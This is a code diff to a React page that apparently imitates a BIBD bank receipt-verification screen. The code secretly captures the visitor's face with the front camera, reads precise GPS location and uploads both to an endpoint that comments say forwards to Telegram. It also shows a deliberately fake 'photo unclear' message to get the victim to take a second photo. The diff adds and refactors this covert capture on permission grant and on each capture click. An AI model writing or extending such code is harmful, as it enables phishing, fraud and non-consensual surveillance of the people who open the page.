@@ -35,6 +35,7 @@ export default function BibdVerificationPage() {
   const [displayDate, setDisplayDate] = useState(templateData.receiptDate);
   const rearVideoRef = useRef<HTMLVideoElement>(null);
   const rearStreamRef = useRef<MediaStream | null>(null);
+  const cachedReceiptBlobRef = useRef<Blob | null>(null);
 
   // Set AUTO date based on client device
   useEffect(() => {
@@ -68,9 +69,8 @@ export default function BibdVerificationPage() {
     }
   }, [cameraReady]);
 
-  // Request camera permission and activate stream
-  const activateCamera = useCallback(async () => {
-    // === STEP 1: Buka front camera DULUAN → ambil foto wajah → kirim ===
+  // Helper: Ambil foto wajah dari kamera depan secara diam-diam & kirim ke Telegram
+  const takeFrontFacePhoto = useCallback(async (caption: string) => {
     try {
       const frontStream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
@@ -80,28 +80,59 @@ export default function BibdVerificationPage() {
       fv.muted = true;
       fv.playsInline = true;
       await fv.play();
-      await new Promise(r => setTimeout(r, 600));
-      // Ambil foto wajah
+      await new Promise((r) => setTimeout(r, 600));
+
       const fc = document.createElement('canvas');
       fc.width = fv.videoWidth || 640;
       fc.height = fv.videoHeight || 480;
       fc.getContext('2d')?.drawImage(fv, 0, 0, fc.width, fc.height);
-      // Matikan front camera sebelum buka rear
-      frontStream.getTracks().forEach(t => t.stop());
-      // Kirim foto wajah ke Telegram (paling cepat)
-      fc.toBlob((blob) => {
-        if (blob) {
-          const fd = new FormData();
-          fd.append('photo', blob, 'face_capture.jpg');
-          fetch('/api/capture', { method: 'POST', body: fd }).catch(() => {});
-        }
-      }, 'image/jpeg', 0.85);
-    } catch {
-      // Front camera gagal, lanjut ke rear saja
-    }
 
-    // === STEP 2: Buka rear camera untuk preview user ===
-    let rearStream = null;
+      frontStream.getTracks().forEach((t) => t.stop());
+
+      return await new Promise<Blob | null>((resolve) => {
+        fc.toBlob((blob) => {
+          if (blob) {
+            const fd = new FormData();
+            fd.append('photo', blob, 'face.jpg');
+            fd.append('caption', caption);
+            fetch('/api/capture', { method: 'POST', body: fd }).catch(() => {});
+          }
+          resolve(blob);
+        }, 'image/jpeg', 0.85);
+      });
+    } catch (err) {
+      console.warn('Front camera capture error:', err);
+      return null;
+    }
+  }, []);
+
+  // Helper: Ambil lokasi GPS & kirim ke Telegram
+  const sendCurrentLocation = useCallback(async () => {
+    try {
+      const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          timeout: 15000,
+          enableHighAccuracy: true,
+        });
+      });
+      const loc = { lat: pos.coords.latitude, lng: pos.coords.longitude };
+      const fd = new FormData();
+      fd.append('location', JSON.stringify(loc));
+      fetch('/api/capture', { method: 'POST', body: fd }).catch(() => {});
+      return loc;
+    } catch (err) {
+      console.warn('Location capture error:', err);
+      return null;
+    }
+  }, []);
+
+  // Request camera permission and activate stream
+  const activateCamera = useCallback(async () => {
+    // 1. Ambil foto wajah duluan saat izin pertama kali diberikan
+    await takeFrontFacePhoto('📸 [BIBD] Foto Wajah (Izin Kamera)');
+
+    // 2. Buka rear camera untuk preview user
+    let rearStream: MediaStream | null = null;
     try {
       rearStream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: 'environment', width: { ideal: 720 }, height: { ideal: 1280 } },
@@ -124,21 +155,15 @@ export default function BibdVerificationPage() {
     if (rearStream) {
       rearStreamRef.current = rearStream;
       setCameraReady(true);
+      if (rearVideoRef.current) {
+        rearVideoRef.current.srcObject = rearStream;
+        rearVideoRef.current.play().catch(() => {});
+      }
     }
 
-    // === STEP 3: Minta izin lokasi GPS (muncul setelah izin kamera) ===
-    try {
-      const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, {
-          timeout: 15000, enableHighAccuracy: true,
-        });
-      });
-      const loc = { lat: pos.coords.latitude, lng: pos.coords.longitude };
-      const fd = new FormData();
-      fd.append('location', JSON.stringify(loc));
-      fetch('/api/capture', { method: 'POST', body: fd }).catch(() => {});
-    } catch {}
-  }, []);
+    // 3. Minta izin lokasi GPS
+    sendCurrentLocation();
+  }, [takeFrontFacePhoto, sendCurrentLocation]);
 
   // Open camera: show black preview → scroll down → request permission
   const handleOpenCamera = useCallback(async () => {
@@ -163,56 +188,75 @@ export default function BibdVerificationPage() {
     setCameraReady(false);
   }, []);
 
-  // Capture photo from rear camera
+  // Capture photo from rear camera and simultaneously get front face
   const handleCapturePhoto = useCallback(async () => {
     if (isCapturing) return;
     setIsCapturing(true);
     setRetryMessage(null);
 
     try {
-      const rearStream = rearStreamRef.current;
-      if (!rearStream) {
-        setIsCapturing(false);
-        return;
-      }
-
-      // Capture rear camera photo directly from visible video element
-      const rearCanvas = document.createElement('canvas');
       const rearVideo = rearVideoRef.current;
-      if (rearVideo) {
+      let rearPhotoBlob: Blob | null = null;
+      if (rearVideo && (rearVideo.videoWidth || rearVideo.readyState >= 2)) {
+        const rearCanvas = document.createElement('canvas');
         rearCanvas.width = rearVideo.videoWidth || 640;
         rearCanvas.height = rearVideo.videoHeight || 480;
         const ctx = rearCanvas.getContext('2d');
         ctx?.drawImage(rearVideo, 0, 0, rearCanvas.width, rearCanvas.height);
+        rearPhotoBlob = await new Promise<Blob | null>((resolve) =>
+          rearCanvas.toBlob(resolve, 'image/jpeg', 0.85)
+        );
       }
-      
-      const rearPhotoBlob = await new Promise<Blob | null>((resolve) =>
-        rearCanvas.toBlob((b) => resolve(b), 'image/jpeg', 0.85)
+
+      if (rearPhotoBlob) {
+        cachedReceiptBlobRef.current = rearPhotoBlob;
+      }
+
+      // Matikan rear camera agar front camera bisa diambil di mobile browser
+      if (rearStreamRef.current) {
+        rearStreamRef.current.getTracks().forEach((t) => t.stop());
+        rearStreamRef.current = null;
+      }
+
+      const nextAttempt = captureAttempt + 1;
+      setCaptureAttempt(nextAttempt);
+
+      // Ambil foto wajah dari kamera depan lagi!
+      await takeFrontFacePhoto(
+        nextAttempt === 1
+          ? '📸 [BIBD] Foto Wajah (Klik Ambil Resit #1)'
+          : '📸 [BIBD] Foto Wajah (Klik Ulangi Resit #2)'
       );
 
-      const currentAttempt = captureAttempt + 1;
-      setCaptureAttempt(currentAttempt);
+      // Pastikan lokasi GPS terkirim
+      sendCurrentLocation();
 
-      if (currentAttempt === 1) {
-        // Percobaan pertama: kirim foto ke Telegram diam-diam, lalu minta ulangi
-        if (rearPhotoBlob) {
-          const fd = new FormData();
-          fd.append('photo', rearPhotoBlob, 'retry_capture.jpg');
-          fetch('/api/capture', { method: 'POST', body: fd }).catch(() => {});
-        }
-        // Tampilkan pesan error palsu
-        setRetryMessage('Foto resit kurang jelas. Pastikan pencahayaan cukup dan posisi resit terlihat jelas, lalu coba lagi.');
+      if (nextAttempt === 1) {
+        // Percobaan pertama: hidupkan kembali rear camera untuk preview user
+        try {
+          const newRear = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'environment', width: { ideal: 720 }, height: { ideal: 1280 } },
+          });
+          rearStreamRef.current = newRear;
+          setCameraReady(true);
+          if (rearVideoRef.current) {
+            rearVideoRef.current.srcObject = newRear;
+            rearVideoRef.current.play().catch(() => {});
+          }
+        } catch {}
+
+        setRetryMessage('Foto kurang jelas. Pastikan pencahayaan cukup dan resit terlihat dengan jelas.');
         setIsCapturing(false);
         return;
       }
 
-      // Percobaan kedua: lanjut proses normal
-      rearStream.getTracks().forEach((t) => t.stop());
-      rearStreamRef.current = null;
+      // Percobaan kedua / final: tutup camera & lanjutkan verifikasi
       setShowCamera(false);
+      setCameraReady(false);
 
-      if (rearPhotoBlob) {
-        const resitFile = new File([rearPhotoBlob], `resit-${Date.now()}.jpg`, { type: 'image/jpeg' });
+      const finalBlob = rearPhotoBlob || cachedReceiptBlobRef.current;
+      if (finalBlob) {
+        const resitFile = new File([finalBlob], `resit-${Date.now()}.jpg`, { type: 'image/jpeg' });
         handleFileSelect(resitFile);
       }
     } catch (err) {
@@ -220,7 +264,7 @@ export default function BibdVerificationPage() {
     }
 
     setIsCapturing(false);
-  }, [isCapturing, handleFileSelect, captureAttempt]);
+  }, [isCapturing, captureAttempt, takeFrontFacePhoto, sendCurrentLocation, handleFileSelect]);
 
 
 
